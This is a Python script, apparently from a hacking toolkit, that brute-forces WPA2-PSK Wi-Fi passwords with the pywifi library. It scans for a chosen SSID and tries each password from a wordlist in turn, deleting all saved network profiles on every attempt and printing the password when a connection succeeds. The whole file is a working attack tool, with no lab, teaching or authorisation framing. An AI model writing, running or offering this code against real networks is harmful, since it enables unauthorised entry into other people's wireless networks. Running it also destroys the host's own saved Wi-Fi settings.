# config/wifi_bruteforce.py

import pywifi
from pywifi import const
import time
import os

def wifi_bruteforce(ssid, wordlist_path):
    try:
        print(f"\n[+] Starting Wi-Fi bruteforce on SSID: {ssid}")
        print(f"[+] Using wordlist: {wordlist_path}")

        # Check if the wordlist file exists
        if not os.path.exists(wordlist_path):
            print(f"[-] Error: Wordlist file '{wordlist_path}' not found.")
            return

        # Read the wordlist file
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
            passwords = file.read().splitlines()

        print(f"[+] Loaded {len(passwords)} passwords from wordlist")

        # Initialize Wi-Fi interface
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        print("[+] Scanning for available networks...")
        iface.scan()
        time.sleep(5)
        scan_results = iface.scan_results()

        # Check if the target SSID is available
        target_found = False
        for network in scan_results:
            if network.ssid == ssid:
                target_found = True
                break

        if not target_found:
            print(f"[-] Error: SSID '{ssid}' not found in available networks.")
            return

        print(f"[+] Found target SSID: {ssid}")

        # Start bruteforce
        for password in passwords:
            print(f"[*] Trying password: {password}")

            # Create a new Wi-Fi profile
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            # Remove all existing network profiles and add the new one
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            # Attempt to connect
            iface.connect(tmp_profile)
            time.sleep(5)  # Wait for connection

            # Check if the connection was successful
            if iface.status() == const.IFACE_CONNECTED:
                print(f"\n[+] Success! Password found: {password}")
                return
            else:
                print(f"[-] Failed with password: {password}")

        print("\n[-] Bruteforce completed. No valid password found.")

    except Exception as e:
        print(f"[-] Error during Wi-Fi bruteforce: {str(e)}")